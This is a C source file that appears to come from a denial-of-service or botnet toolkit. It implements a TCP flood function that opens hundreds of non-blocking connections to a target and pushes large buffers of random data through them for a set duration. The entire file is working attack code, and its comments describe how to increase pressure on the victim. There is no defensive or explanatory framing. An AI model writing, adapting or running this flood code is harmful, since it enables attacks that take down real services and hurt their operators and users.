#define _GNU_SOURCE
#include "headers/attack_params.h"

/* TCP flood: maintain a pool of non-blocking connections and hammer them.
   Increase MAX_CONNECTIONS for more concurrent sockets = more pressure. */
#define MAX_CONNECTIONS 512
#define BUFFER_SIZE     (1024 * 1024) /* 1MB send buffer pre-filled once */

static int connect_socket(struct sockaddr_in *addr) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    int one = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    /* Large send buffer per socket */
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0) { close(sock); return -1; }
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    if (connect(sock, (struct sockaddr*)addr, sizeof(*addr)) < 0) {
        if (errno != EINPROGRESS) { close(sock); return -1; }
    }
    return sock;
}

void tcp_attack(attack_params *params) {
    int  sockets[MAX_CONNECTIONS];
    memset(sockets, -1, sizeof(sockets));
    int active_sockets = 0;

    /* Pre-fill random buffer once */
    static unsigned char buffer[BUFFER_SIZE];
    static int buf_ready = 0;
    if (!buf_ready) {
        for (int i = 0; i < BUFFER_SIZE; i++)
            buffer[i] = (unsigned char)(rand() & 0xFF);
        buf_ready = 1;
    }

    int psize = params->len > 0 ? (int)params->len : 1400;
    if (psize > BUFFER_SIZE) psize = BUFFER_SIZE;

    time_t end_time = time(NULL) + params->duration;
    time_t last_cleanup = 0;
    uint64_t pkt = 0;

    while (params->active) {
        if ((pkt & 4095) == 0 && time(NULL) >= end_time) break;

        /* Fill connection pool to max */
        while (active_sockets < MAX_CONNECTIONS) {
            int sock = connect_socket(&params->target_addr);
            if (sock < 0) break;
            sockets[active_sockets++] = sock;
        }

        /* Use epoll-style poll for write-readiness — faster than select() */
        struct pollfd pfds[MAX_CONNECTIONS];
        int nfds = 0;
        for (int i = 0; i < active_sockets; i++) {
            if (sockets[i] >= 0) {
                pfds[nfds].fd      = sockets[i];
                pfds[nfds].events  = POLLOUT;
                pfds[nfds].revents = 0;
                nfds++;
            }
        }

        if (nfds == 0) { usleep(500); continue; }

        int ready = poll(pfds, nfds, 5); /* 5ms max wait */
        if (ready > 0) {
            for (int i = 0; i < nfds; i++) {
                if (!(pfds[i].revents & (POLLOUT | POLLERR | POLLHUP))) continue;

                if (pfds[i].revents & (POLLERR | POLLHUP)) {
                    /* Dead socket — find it and compact */
                    for (int j = 0; j < active_sockets; j++) {
                        if (sockets[j] == pfds[i].fd) {
                            close(sockets[j]);
                            sockets[j] = sockets[--active_sockets];
                            sockets[active_sockets] = -1;
                            break;
                        }
                    }
                    continue;
                }

                /* Check connect() outcome */
                int so_error = 0;
                socklen_t slen = sizeof(so_error);
                getsockopt(pfds[i].fd, SOL_SOCKET, SO_ERROR, &so_error, &slen);
                if (so_error != 0 && so_error != EINPROGRESS) {
                    for (int j = 0; j < active_sockets; j++) {
                        if (sockets[j] == pfds[i].fd) {
                            close(sockets[j]);
                            sockets[j] = sockets[--active_sockets];
                            sockets[active_sockets] = -1;
                            break;
                        }
                    }
                    continue;
                }

                ssize_t sent = send(pfds[i].fd, buffer, psize, MSG_NOSIGNAL | MSG_DONTWAIT);
                if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    for (int j = 0; j < active_sockets; j++) {
                        if (sockets[j] == pfds[i].fd) {
                            close(sockets[j]);
                            sockets[j] = sockets[--active_sockets];
                            sockets[active_sockets] = -1;
                            break;
                        }
                    }
                }
                pkt++;
            }
        }

        /* Periodic cleanup of RST'd sockets */
        time_t now = time(NULL);
        if (now - last_cleanup >= 2) {
            for (int i = 0; i < active_sockets; i++) {
                char test;
                if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    sockets[active_sockets] = -1;
                    i--;
                }
            }
            last_cleanup = now;
        }
    }

    for (int i = 0; i < active_sockets; i++)
        if (sockets[i] >= 0) close(sockets[i]);
}
